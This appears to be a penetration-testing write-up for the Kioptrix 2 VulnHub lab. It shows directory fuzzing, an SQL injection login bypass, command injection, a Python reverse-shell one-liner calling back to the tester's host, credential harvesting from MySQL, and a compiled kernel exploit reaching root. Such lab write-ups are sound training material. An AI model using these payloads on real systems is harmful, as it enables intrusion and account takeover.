# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/kioptrix2/192.168.1.102]
└─# ffuf -u http://192.168.1.102/FUZZ -w /usr/share/wordlists/dirb/common.txt -e ".html,.txt,.php" -fw 21

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.102/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 21
________________________________________________

                        [Status: 200, Size: 667, Words: 35, Lines: 32]
index.php               [Status: 200, Size: 667, Words: 35, Lines: 32]
manual                  [Status: 301, Size: 315, Words: 20, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 8158 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

## TCP/80 - HTTPS
### FFUF
- Same as TCP/80


# Initial Foothold
## TCP/80 - HTTP - SQLi + Command Injection
1. Proceed to `/manual`
	- Default Apache Documentation
2. Proceed to `/index.php`
	![](images/Pasted%20image%2020220123170339.png)
3. Attempt SQLi Auth Bypass
	```
	# OR 1=1#
	```
	![](images/Pasted%20image%2020220123170557.png)
4. Attempt Command Injection
	```
	`id`
	;id
	```
	![](images/Pasted%20image%2020220123170705.png)
5. Execute Reverse Shell
	```
	;python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.1.1",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
	```
6. Obtain apache shell
	```
	┌──(root💀kali)-[~/vulnHub/kioptrix2/192.168.1.102]
	└─# nc -nvlp 4444
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::4444
	Ncat: Listening on 0.0.0.0:4444
	Ncat: Connection from 192.168.1.102.
	Ncat: Connection from 192.168.1.102:32778.
	sh-3.00$ whoami
	whoami
	apache
	sh-3.00$ 
	```
	![](images/Pasted%20image%2020220123171406.png)


# Privilege Escalation
## Root - Via Kernel Exploit
1. Check for SQL Credentials, view index.php
		![](images/Pasted%20image%2020220123174519.png)
	- john:hiroshima
2. Access mysql to obtain more creds
	```
	bash-3.00$ mysql -u john -p
	Enter password: hiroshima
	Welcome to the MySQL monitor.  Commands end with ; or \g.
	Your MySQL connection id is 25 to server version: 4.1.22

	Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

	mysql> show databases;
	+----------+
	| Database |
	+----------+
	| mysql    |
	| test     |
	| webapp   |
	+----------+
	
	mysql> use webapp
	Reading table information for completion of table and column names
	You can turn off this feature to get a quicker startup with -A
	
	Database changed
	mysql> show tables;
	+------------------+
	| Tables_in_webapp |
	+------------------+
	| users            |
	+------------------+
	1 row in set (0.00 sec)

	mysql> show columns from users;
	+----------+--------------+------+-----+---------+-------+
	| Field    | Type         | Null | Key | Default | Extra |
	+----------+--------------+------+-----+---------+-------+
	| id       | int(11)      | YES  |     | NULL    |       |
	| username | varchar(100) | YES  |     | NULL    |       |
	| password | varchar(10)  | YES  |     | NULL    |       |
	+----------+--------------+------+-----+---------+-------+
	3 rows in set (0.00 sec)

	mysql> select * from users;
	+------+----------+------------+
	| id   | username | password   |
	+------+----------+------------+
	|    1 | admin    | 5afac8d85f |
	|    2 | john     | 66lajGGbla |
	+------+----------+------------+
	2 rows in set (0.00 sec)
	```
3. Tried to switch user to john w/ obtain creds, failed
4. Ran linpeas
	![](images/Pasted%20image%2020220123174958.png)
5. Find Kernel Exploit
	```
	┌──(root💀kali)-[~/vulnHub/kioptrix2/192.168.1.102/exploit]
	└─# searchsploit 2.6 centos
	 
	Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 
	linux/local/9545.c
	

	```
6. Transfer Exploit
7. Compile & Exploit
	```
	sh-3.00$ gcc 9545.c -o exploit; chmod +x exploit; ./exploit
	gcc 9545.c -o exploit; chmod +x exploit; ./exploit
	9545.c:376:28: warning: no newline at end of file
	sh-3.00# whoami
	whoami
	root
	sh-3.00# cd /root
	cd /root
	sh-3.00# ls
	```
	![](images/Pasted%20image%2020220123180749.png)


---
Tags: #exploit/sqli/auth-bypass #exploit/command-injection #linux-priv-esc/kernel-exploit 

---